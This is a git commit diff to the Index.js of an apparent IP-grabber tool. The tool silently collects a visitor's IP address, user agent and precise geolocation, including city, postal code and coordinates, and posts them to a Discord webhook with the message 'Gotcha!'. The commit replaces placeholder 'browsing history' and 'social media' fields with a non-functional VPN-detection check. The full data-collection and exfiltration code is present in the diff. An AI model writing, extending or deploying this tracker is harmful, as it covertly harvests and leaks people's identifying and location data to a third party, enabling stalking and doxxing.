7933d49558365c5aefedd6744320b811ab49b75f
1onlyremo <99085233+1onlyremo@users.noreply.github.com>
2023-07-04 23:18:51 +0200

    Update Index.js

--- Index.js
+++ Index.js
@@ -15,55 +15,50 @@ fetch('./config.json')
       const locationData = await fetch('https://geolocation-db.com/json/');
       const locationResult = await locationData.json();
 
-      // Code to access browsing history
-      const browsingHistory = "Not Working 🏧";
-
-      // Code to access social media data
-      const socialMediaData = "Not Working 🏧";
+      // VPN detection algorithm
+      let isVPN = false;
+      if (typeof VPNConn !== 'undefined' && VPNConn.connection_type === 'Corporate') {
+        isVPN = true;
+      }
 
       const message = {
-  username: 'By 1onlyremo🦇',
-  avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
-  embeds: [
-    {
-      title: 'User Info',
-      description: 'Gotcha! Here is the detailed info about the user 👀',
-      fields: [
-        {
-          name: 'IP Address',
-          value: ip
-        },
-        {
-          name: 'User Agent',
-          value: userAgent
-        },
-        {
-          name: 'Location Data',
-          value: `Country Code: ${locationResult.country_code}\nCountry Name: ${locationResult.country_name}\nCity: ${locationResult.city}\nPostal: ${locationResult.postal}\nLatitude: ${locationResult.latitude}\nLongitude: ${locationResult.longitude}`
-        },
-        {
-          name: 'Browsing History',
-          value: 'Coming Soon: ' + browsingHistory
-        },
-        {
-          name: 'Social Media Profiles',
-          value: 'Coming Soon: ' + socialMediaData
-        }
-      ],
-      footer: {
-        text: 'Made By 1onlyremo#7312'
-      }
-    }
-  ]
-};
-      
+        username: 'By 1onlyremo🦇',
+        avatar_url: 'https://www.discordavatars.com/wp-content/uploads/2020/05/hacker-avatar-023.jpg',
+        embeds: [
+          {
+            title: 'User Info',
+            description: 'Gotcha! Here is the detailed info about the user 👀',
+            fields: [
+              {
+                name: 'IP Address',
+                value: ip,
+              },
+              {
+                name: 'User Agent',
+                value: userAgent,
+              },
+              {
+                name: 'Location Data',
+                value: `Country Code: ${locationResult.country_code}\nCountry Name: ${locationResult.country_name}\nCity: ${locationResult.city}\nPostal: ${locationResult.postal}\nLatitude: ${locationResult.latitude}\nLongitude: ${locationResult.longitude}`,
+              },
+              {
+                name: 'VPN Detected',
+                value: isVPN ? ':white_check_mark: Yes' : ':x: No',
+              },
+            ],
+            footer: {
+              text: 'Made By 1onlyremo#7312',
+            },
+          },
+        ],
+      };
 
       fetch(webhook, {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/json',
         },
-        body: JSON.stringify(message)
+        body: JSON.stringify(message),
       })
         .then(() => {
           console.log('Message sent successfully!');
@@ -73,6 +68,5 @@ fetch('./config.json')
         });
     };
 
-    
     request();
   });
